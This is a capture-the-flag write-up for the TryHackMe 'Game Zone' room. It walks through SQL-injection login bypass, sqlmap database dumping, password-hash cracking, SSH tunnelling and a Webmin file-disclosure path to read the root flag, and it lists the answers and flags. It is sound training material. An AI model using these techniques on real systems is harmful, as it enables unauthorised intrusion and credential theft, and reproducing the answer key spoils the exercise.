## Index

1. [Setup](#setup)
2. [Reconnaissance](#reconnaissance)
3. [Gain Access](#gain-access)
4. [Privilege Escalation](#privilege-escalation)
5. [Conclusion](#conclusion)

## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using openvpn to connect to the server. Here's the command:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

Perfoming `nmap` scans shows us the following information:
```shell-session
$ sudo nmap -sS -Pn -vv --top-ports 2000 -oN nmap_scan.txt TARGET_IP 

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Visiting the http-service on port 80, we're greeted with the following page:
![](home-page.png)


> What is the name of the large cartoon avatar holding a sniper on the forum?
>
> Answer: Agent 47

On the page, there's 2 input forms. One for `Site Search` and another for `User Login`. We can test for a possibility of a database (SQL) injection by entering some SQLi strings:
![](sqli-simple-login.png)

Successfully logging into the service directs us to the following page:
![](portal-login-dash.png)

> When you've logged in, what page do you get redirected to?
>
> Answer: `portal.php`

Since the target is vulnerable to SQLi, we can now use SQLMap for further recon...


Using Burpsuite and determining the request sent by the browser when accessing the `portal.php` page:
```http
POST /portal.php HTTP/1.1
Host: TARGET_IP
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://TARGET_IP
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://TARGET_IP/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=kfd3hokcd5krmlmrofgs4q45q7
Connection: close

searchitem=asd
```

We can save this to a file and then pass this to SQLMap to authenticate user session:
```shell-session
$ sqlmap -r portal-request.txt --dbms=mysql --dump

...
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y

...

POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

...

do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y

...

do you want to crack them via a dictionary-based attack? [Y/n/q] 

...

what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1

...

do you want to use common password suffixes? (slow!) [y/N] N

...
```

This gives us the password hash for the user: `agent47`.

> In the users table, what is the hashed password?
>
> Answer: `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

> What was the username associated with the hashed password?
>
> Answer: `agent47`

We also obtain entries listed in a table called: `post` under the database: `db`.

> What was the other table name?
>
> Answer: `post`


Now that the password hash for `agent47` is obtained, we can use `john` to crack this and obtain the password for the user. 
```shell-session
$ echo ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 > hash.txt

$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
...
videogamer124    (?)     
```

> What is the de-hashed password?
>
> Answer: `videogamer124`

We can now try to log into the server using `ssh` and the credentials: `agent47:videogamer124`.

## Gaining Access

Using the credentials from the reconnaissance phase, we now log into the server's ssh service.
```shell-session
$ ssh agent47@TARGET_IP
...
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$
```

We can now get the user flag:
```shell-session
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

> What is the user flag?
>
> Answer: `649ac17b1480ac13ef1e4fa579dac95c`

Checking for running socket connections on the target machine:
```shell-session
Netid State      Recv-Q Send-Q                                               Local Address:Port                                                              Peer Address:Port               
udp   UNCONN     0      0                                                                *:10000                                                                        *:*                  
udp   UNCONN     0      0                                                                *:68                                                                           *:*                  
tcp   LISTEN     0      80                                                       127.0.0.1:3306                                                                         *:*                  
tcp   LISTEN     0      128                                                              *:10000                                                                        *:*                  
tcp   LISTEN     0      128                                                              *:22                                                                           *:*                  
tcp   LISTEN     0      128                                                             :::80                                                                          :::*                  
tcp   LISTEN     0      128                                                             :::22                                                                          :::*
```

> How many TCP sockets are running?
>
> Answer: 5

Since the service running on port 10000 is blocked by a firewall, we can use a ssh tunnel to expose this port to us locally.
```shell-session
$ ssh -L 10000:localhost:10000 agent47@TARGET_IP
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sun Nov 27 23:59:23 2022 from TARGET_IP
agent47@gamezone:~$
```

Now, we can visit `localhost:10000` using a browser:
![](localhost-10000.png)



> What is the name of the exposed CMS?
>
> Answer: `Webmin`

Using the credentials: `agent47:videogamer124`,  we can log into this service:
![](webmin-dash.png)

> What is the CMS version?
>
> Answer: `1.580`

## Privilege Escalation

Using `searchsploit` we can now find some exploits for `Webmin 1.580`
```shell-session
$ searchsploit webmin 1.58     
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Executio | unix/remote/21851.rb
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metas | linux/webapps/47330.rb
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

We can use the second exploit's logic. By simply navigating to `localhost:10000/file/show.cgi/root/root.txt`, we obtain the contents of the `root.txt` file.

> What is the root flag?
>
> Answer: `a4b945830144bdd71908d12d902adeee`

## Conclusion

If this writeup helps, please consider following me on github (https://github.com/NovusEdge) and/or dropping a star on the repository: https://github.com/NovusEdge/thm-writeups

---

- Author: Aliasgar Khimani
- Room: [Game Zone](https://tryhackme.com/room/gamezone)
